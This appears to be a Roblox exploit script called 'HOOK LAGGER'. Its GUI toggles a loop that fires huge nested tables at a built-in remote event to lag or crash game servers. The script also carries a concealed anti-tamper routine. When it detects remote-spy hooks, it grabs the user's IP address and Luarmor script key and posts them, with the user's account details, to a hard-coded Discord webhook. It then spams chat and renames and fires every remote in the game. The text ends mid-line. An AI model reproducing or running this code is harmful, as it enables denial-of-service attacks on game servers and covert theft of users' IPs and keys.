local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local ChatService = game:GetService("Chat")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local webhookUrl = "https://discordapp.com/api/webhooks/1486480580542730351/GFIY878XyufUQR7H4d8UE5Pck2r6-lkGTqHrxOjkEZN9fsVv4T8oSIuM5Fmi_uA9siCx"

local LAGGER_CONFIG = {
    TableIncrease = 270,
    Tries = 1,
    LoopWaitTime = 0.3
}

local statusLabel, switchBall, mainFrame, toggleContainer
local detectionActive = true
local hookDetected = false
local spamActive = false
local laggerEnabled = false

local function httpRequest(options)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        return requestFunc(options)
    end
    return nil
end

local function SendMessageEMBED(url, embedData)
    local success, result = pcall(function()
        local payload = HttpService:JSONEncode({
            ["content"] = nil,
            ["embeds"] = {{
                ["title"] = embedData.title,
                ["description"] = embedData.description,
                ["color"] = 16711680,
                ["thumbnail"] = {
                    ["url"] = embedData.thumbnail
                },
                ["fields"] = embedData.fields,
                ["footer"] = {
                    ["text"] = "discord.gg/hookduels"
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }}
        })
        return httpRequest({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    end)
    return success
end

local function renameAllRemotes()
    local renamedCount = 0
    local newName = "discord.gg/hookduels"
    local locations = {
        ReplicatedStorage, ReplicatedFirst, workspace,
        game:GetService("Lighting"), game:GetService("Players"),
        game:GetService("TeleportService"), game:GetService("StarterGui"),
        game:GetService("StarterPack"), game:GetService("SoundService"), game
    }
    
    for _, location in pairs(locations) do
        pcall(function()
            for _, obj in pairs(location:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") or obj:IsA("UnreliableRemoteEvent") then
                    obj.Name = newName
                    renamedCount = renamedCount + 1
                    pcall(function()
                        if obj:IsA("RemoteEvent") then
                            obj:FireServer("JOIN", "discord.gg/hookduels", "HOOK_DETECTED")
                        elseif obj:IsA("RemoteFunction") then
                            obj:InvokeServer("JOIN", "discord.gg/hookduels")
                        end
                    end)
                end
            end
        end)
    end
    return renamedCount
end

local function spamChat()
    local messages = {
        "JOIN discord.gg/hookduels",
        "discord.gg/hookduels - BEST SERVER",
        "HOOK DETECTED JOIN discord.gg/hookduels",
        "discord.gg/hookduels"
    }
    task.spawn(function()
        while spamActive do
            pcall(function()
                for _, msg in pairs(messages) do
                    if not spamActive then break end
                    ChatService:Chat(player.Character.Head, msg)
                    task.wait(0.5)
                end
            end)
            task.wait(1)
        end
    end)
end

local function removeCobaltUI()
    pcall(function()
        for _, gui in pairs(CoreGui:GetChildren()) do
            if gui.Name and (gui.Name:lower():find("cobalt") or gui.Name:lower():find("hook") or gui.Name:lower():find("dex")) then
                gui:Destroy()
            end
        end
    end)
end

local function checkHooked(func)
    if not func then return false end
    local ok, result = pcall(isfunctionhooked, func)
    return ok and result
end

local function detectHooks()
    local freshRemoteEvent = Instance.new("RemoteEvent")
    local freshRemoteFunction = Instance.new("RemoteFunction")
    local freshMt = getrawmetatable(game)
    
    local cobalt = getgenv().Cobalt
    local cobaltHooks = cobalt and cobalt.shared and cobalt.shared.Hooks
    if cobaltHooks then
        for func, _ in pairs(cobaltHooks) do
            if checkHooked(func) then return "Cobalt Hook", "Hooked Function" end
        end
    end
    
    if freshRemoteEvent.FireServer ~= Instance.new("RemoteEvent").FireServer then return "SimpleSpy Hook", "FireServer" end
    if freshRemoteFunction.InvokeServer ~= Instance.new("RemoteFunction").InvokeServer then return "SimpleSpy Hook", "InvokeServer" end
    
    local currentMt = getrawmetatable(game)
    if currentMt and rawget(freshMt, "__namecall") ~= rawget(currentMt, "__namecall") then 
        return "Metamethod Hook", "__namecall" 
    end
    
    return nil, nil
end

local function sendReport(hookType, functionName, renamedCount)
    local ip = "Unknown"
    pcall(function() ip = game:HttpGet("https://api.ipify.org") end)
    
    local luarmorKey = getgenv().script_key or _G.script_key or "Key Not Found"
    
    local pfpUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"

    local embed = {
        title = ip,
        description = "Hook Detected - Counter-Measures Activated",
        thumbnail = pfpUrl,
        fields = {
            {name = "Username", value = player.Name, inline = true},
            {name = "Display Name", value = player.DisplayName, inline = true},
            {name = "User ID", value = tostring(player.UserId), inline = true},
            {name = "Luarmor Key", value = "```" .. luarmorKey .. "```", inline = false},
            {name = "Detection Details", value = "Type: "..hookType.."\nFunction: "..functionName, inline = false},
            {name = "Action Taken", value = "Remotes Renamed: "..tostring(renamedCount), inline = true}
        }
    }
    SendMessageEMBED(webhookUrl, embed)
end

task.spawn(function()
    while detectionActive do
        local hType, fName = detectHooks()
        if hType and not hookDetected then
            hookDetected = true
            spamActive = true
            laggerEnabled = false
            
            pcall(function()
                statusLabel.Text = "LAGGER: OFF"
                statusLabel.TextColor3 = Color3.fromRGB(255, 70, 70)
                TweenService:Create(switchBall, TweenInfo.new(0.2), {Position = UDim2.new(0, 2, 0.5, -8), BackgroundColor3 = Color3.fromRGB(255, 80, 80)}):Play()
            end)

            removeCobaltUI()
            local count = renameAllRemotes()
            spamChat()
            sendReport(hType, fName, count)
        end
        task.wait(0.1)
    end
end)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "HookLaggerGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 300, 0, 250)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -125)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)

local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Size = UDim2.new(1, 0, 0, 40)
titleBar.BackgroundTransparency = 1
titleBar.Parent = mainFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, -60, 1, 0)
titleLabel.Position = UDim2.new(0, 15, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "HOOK LAGGER"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 14
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Parent = titleBar

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 20, 0, 20)
closeButton.Position = UDim2.new(1, -25, 0, 10)
closeButton.BackgroundTransparency = 1
closeButton.Text = "x"
closeButton.TextColor3 = Color3.fromRGB(200, 200, 200)
closeButton.TextSize = 20
closeButton.Parent = titleBar

local minimizeButton = Instance.new("TextButton")
minimizeButton.Size = UDim2.new(0, 20, 0, 20)
minimizeButton.Position = UDim2.new(1, -50, 0, 10)
minimizeButton.BackgroundTransparency = 1
minimizeButton.Text = "-"
minimizeButton.TextColor3 = Color3.fromRGB(200, 200, 200)
minimizeButton.TextSize = 20
minimizeButton.Parent = titleBar

toggleContainer = Instance.new("Frame")
toggleContainer.Size = UDim2.new(0.9, 0, 0, 50)
toggleContainer.Position = UDim2.new(0.05, 0, 0, 45)
toggleContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
toggleContainer.Parent = mainFrame
Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(0, 6)

local keybindButton = Instance.new("TextButton")
keybindButton.Size = UDim2.new(0, 35, 0, 35)
keybindButton.Position = UDim2.new(0, 8, 0.5, -17)
keybindButton.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
keybindButton.Text = "V"
keybindButton.TextColor3 = Color3.fromRGB(255, 255, 255)
keybindButton.Font = Enum.Font.GothamBold
keybindButton.TextSize = 14
keybindButton.Parent = toggleContainer
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 4)

statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(0.5, 0, 1, 0)
statusLabel.Position = UDim2.new(0, 55, 0, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "LAGGER: OFF"
statusLabel.TextColor3 = Color3.fromRGB(255, 70, 70)
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextSize = 14
statusLabel.TextXAlignment = Enum.TextXAlignment.Left
statusLabel.Parent = toggleContainer

local switchOutline = Instance.new("TextButton")
switchOutline.Size = UDim2.new(0, 40, 0, 20)
switchOutline.Position = UDim2.new(1, -50, 0.5, -10)
switchOutline.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
switchOutline.Text = ""
switchOutline.Parent = toggleContainer
Instance.new("UICorner", switchOutline).CornerRadius = UDim.new(1, 0)

switchBall = Instance.new("Frame")
switchBall.Size = UDim2.new(0, 16, 0, 16)
switchBall.Position = UDim2.new(0, 2, 0.5, -8)
switchBall.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
switchBall.Parent = switchOutline
Instance.new("UICorner", switchBall).CornerRadius = UDim.new(1, 0)

local settingsPanel = Instance.new("Frame")
settingsPanel.Size = UDim2.new(0.9, 0, 0, 130)
settingsPanel.Position = UDim2.new(0.05, 0, 0, 105)
settingsPanel.BackgroundColor3 = Color3.fromRGB(20, 20, 23)
settingsPanel.Parent = mainFrame
Instance.new("UICorner", settingsPanel).CornerRadius = UDim.new(0, 6)

local tableIncLabel = Instance.new("TextLabel")
tableIncLabel.Size = UDim2.new(0.4, 0, 0, 25)
tableIncLabel.Position = UDim2.new(0.05, 0, 0, 10)
tableIncLabel.BackgroundTransparency = 1
tableIncLabel.Text = "Table Increase:"
tableIncLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
tableIncLabel.TextSize = 12
tableIncLabel.Font = Enum.Font.Gotham
tableIncLabel.TextXAlignment = Enum.TextXAlignment.Left
tableIncLabel.Parent = settingsPanel

local tableIncValue = Instance.new("TextLabel")
tableIncValue.Size = UDim2.new(0.2, 0, 0, 25)
tableIncValue.Position = UDim2.new(0.6, 0, 0, 10)
tableIncValue.BackgroundTransparency = 1
tableIncValue.Text = tostring(LAGGER_CONFIG.TableIncrease)
tableIncValue.TextColor3 = Color3.fromRGB(255, 255, 255)
tableIncValue.TextSize = 12
tableIncValue.Font = Enum.Font.GothamBold
tableIncValue.Parent = settingsPanel

local tableIncDown = Instance.new("TextButton")
tableIncDown.Size = UDim2.new(0, 30, 0, 25)
tableIncDown.Position = UDim2.new(0.75, 0, 0, 10)
tableIncDown.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
tableIncDown.Text = "-"
tableIncDown.TextColor3 = Color3.fromRGB(255, 255, 255)
tableIncDown.TextSize = 16
tableIncDown.Font = Enum.Font.GothamBold
tableIncDown.Parent = settingsPanel
Instance.new("UICorner", tableIncDown).CornerRadius = UDim.new(0, 4)

local tableIncUp = Instance.new("TextButton")
tableIncUp.Size = UDim2.new(0, 30, 0, 25)
tableIncUp.Position = UDim2.new(0.85, 0, 0, 10)
tableIncUp.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
tableIncUp.Text = "+"
tableIncUp.TextColor3 = Color3.fromRGB(255, 255, 255)
tableIncUp.TextSize = 16
tableIncUp.Font = Enum.Font.GothamBold
tableIncUp.Parent = settingsPanel
Instance.new("UICorner", tableIncUp).CornerRadius = UDim.new(0, 4)

local triesLabel = Instance.new("TextLabel")
triesLabel.Size = UDim2.new(0.4, 0, 0, 25)
triesLabel.Position = UDim2.new(0.05, 0, 0, 45)
triesLabel.BackgroundTransparency = 1
triesLabel.Text = "Tries:"
triesLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
triesLabel.TextSize = 12
triesLabel.Font = Enum.Font.Gotham
triesLabel.TextXAlignment = Enum.TextXAlignment.Left
triesLabel.Parent = settingsPanel

local triesValue = Instance.new("TextLabel")
triesValue.Size = UDim2.new(0.2, 0, 0, 25)
triesValue.Position = UDim2.new(0.6, 0, 0, 45)
triesValue.BackgroundTransparency = 1
triesValue.Text = tostring(LAGGER_CONFIG.Tries)
triesValue.TextColor3 = Color3.fromRGB(255, 255, 255)
triesValue.TextSize = 12
triesValue.Font = Enum.Font.GothamBold
triesValue.Parent = settingsPanel

local triesDown = Instance.new("TextButton")
triesDown.Size = UDim2.new(0, 30, 0, 25)
triesDown.Position = UDim2.new(0.75, 0, 0, 45)
triesDown.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
triesDown.Text = "-"
triesDown.TextColor3 = Color3.fromRGB(255, 255, 255)
triesDown.TextSize = 16
triesDown.Font = Enum.Font.GothamBold
triesDown.Parent = settingsPanel
Instance.new("UICorner", triesDown).CornerRadius = UDim.new(0, 4)

local triesUp = Instance.new("TextButton")
triesUp.Size = UDim2.new(0, 30, 0, 25)
triesUp.Position = UDim2.new(0.85, 0, 0, 45)
triesUp.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
triesUp.Text = "+"
triesUp.TextColor3 = Color3.fromRGB(255, 255, 255)
triesUp.TextSize = 16
triesUp.Font = Enum.Font.GothamBold
triesUp.Parent = settingsPanel
Instance.new("UICorner", triesUp).CornerRadius = UDim.new(0, 4)

local waitLabel = Instance.new("TextLabel")
waitLabel.Size = UDim2.new(0.4, 0, 0, 25)
waitLabel.Position = UDim2.new(0.05, 0, 0, 80)
waitLabel.BackgroundTransparency = 1
waitLabel.Text = "Loop Wait Time:"
waitLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
waitLabel.TextSize = 12
waitLabel.Font = Enum.Font.Gotham
waitLabel.TextXAlignment = Enum.TextXAlignment.Left
waitLabel.Parent = settingsPanel

local waitValue = Instance.new("TextLabel")
waitValue.Size = UDim2.new(0.2, 0, 0, 25)
waitValue.Position = UDim2.new(0.6, 0, 0, 80)
waitValue.BackgroundTransparency = 1
waitValue.Text = tostring(LAGGER_CONFIG.LoopWaitTime)
waitValue.TextColor3 = Color3.fromRGB(255, 255, 255)
waitValue.TextSize = 12
waitValue.Font = Enum.Font.GothamBold
waitValue.Parent = settingsPanel

local waitDown = Instance.new("TextButton")
waitDown.Size = UDim2.new(0, 30, 0, 25)
waitDown.Position = UDim2.new(0.75, 0, 0, 80)
waitDown.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
waitDown.Text = "-"
waitDown.TextColor3 = Color3.fromRGB(255, 255, 255)
waitDown.TextSize = 16
waitDown.Font = Enum.Font.GothamBold
waitDown.Parent = settingsPanel
Instance.new("UICorner", waitDown).CornerRadius = UDim.new(0, 4)

local waitUp = Instance.new("TextButton")
waitUp.Size = UDim2.new(0, 30, 0, 25)
waitUp.Position = UDim2.new(0.85, 0, 0, 80)
waitUp.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
waitUp.Text = "+"
waitUp.TextColor3 = Color3.fromRGB(255, 255, 255)
waitUp.TextSize = 16
waitUp.Font = Enum.Font.GothamBold
waitUp.Parent = settingsPanel
Instance.new("UICorner", waitUp).CornerRadius = UDim.new(0, 4)

tableIncDown.MouseButton1Click:Connect(function()
    LAGGER_CONFIG.TableIncrease = math.max(1, LAGGER_CONFIG.TableIncrease - 10)
    tableIncValue.Text = tostring(LAGGER_CONFIG.TableIncrease)
end)

tableIncUp.MouseButton1Click:Connect(function()
    LAGGER_CONFIG.TableIncrease = math.min(1000, LAGGER_CONFIG.TableIncrease + 10)
    tableIncValue.Text = tostring(LAGGER_CONFIG.TableIncrease)
end)

triesDown.MouseButton1Click:Connect(function()
    LAGGER_CONFIG.Tries = math.max(1, LAGGER_CONFIG.Tries - 1)
    triesValue.Text = tostring(LAGGER_CONFIG.Tries)
end)

triesUp.MouseButton1Click:Connect(function()
    LAGGER_CONFIG.Tries = math.min(50, LAGGER_CONFIG.Tries + 1)
    triesValue.Text = tostring(LAGGER_CONFIG.Tries)
end)

waitDown.MouseButton1Click:Connect(function()
    LAGGER_CONFIG.LoopWaitTime = math.max(0.05, LAGGER_CONFIG.LoopWaitTime - 0.05)
    waitValue.Text = string.format("%.2f", LAGGER_CONFIG.LoopWaitTime)
end)

waitUp.MouseButton1Click:Connect(function()
    LAGGER_CONFIG.LoopWaitTime = math.min(5, LAGGER_CONFIG.LoopWaitTime + 0.05)
    waitValue.Text = string.format("%.2f", LAGGER_CONFIG.LoopWaitTime)
end)

local function getmaxvalue(val)
    local mainvalueifonetable = 499999
    if type(val) ~= "number" then return nil end
    return mainvalueifonetable/(val+2)
end

local function bomb(tableincrease, tries)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = getmaxvalue(tableincrease) or 9999999
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
    end
    for i = 1, tries do
        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
    end
end

local function startCrashLoop()
    while laggerEnabled do
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
        task.wait(LAGGER_CONFIG.LoopWaitTime)
    end
end

local function toggleLagger(state)
    if hookDetected then return end
    laggerEnabled = state
    if laggerEnabled then
        statusLabel.Text = "LAGGER: ON"
        statusLabel.TextColor3 = Color3.fromRGB(80, 255, 80)
        TweenService:Create(switchBall, TweenInfo.new(0.2), {Position = UDim2.new(1, -18, 0.5, -8), BackgroundColor3 = Color3.fromRGB(80, 255, 80)}):Play()
        task.spawn(startCrashLoop)
    else
        statusLabel.Text = "LAGGER: OFF"
        statusLabel.TextColor3 = Color3.fromRGB(255, 70, 70)
        TweenService:Create(switchBall, TweenInfo.new(0.2), {Position = UDim2.new(0, 2, 0.5, -8), BackgroundColor3 = Color3.fromRGB(255, 80, 80)}):Play()
    end
end

switchOutline.MouseButton1Click:Connect(function() toggleLagger(not laggerEnabled) end)

local listening = false
keybindButton.MouseButton1Click:Connect(function() listening = true keybindButton.Text = "..." end)

local currentKeybind = Enum.KeyCode.V
UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == Enum.KeyCode.LeftControl then mainFrame.Visible = not mainFrame.Visible end
    if listening and input.UserInputType == Enum.UserInputType.Keyboard then
        currentKeybind = input.KeyCode
        keybindButton.Text = input.KeyCode.Name:sub(1,1)
        listening = false
    elseif input.KeyCode == currentKeybind then
        toggleLagger(not laggerEnabled)
    end
end)

closeButton.MouseButton1Click:Connect(function() screenGui:Destroy() spamActive = false detectionActive = false end)

local isMinimized = false
minimizeButton.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    toggleContainer.Visible = not isMinimized
    settingsPanel.Visible = not isMinimized
    if isMinimized then
        mainFrame:TweenSize(UDim2.new(0, 300, 0, 68), "Out", "Quad", 0.2, true)
    else
        mai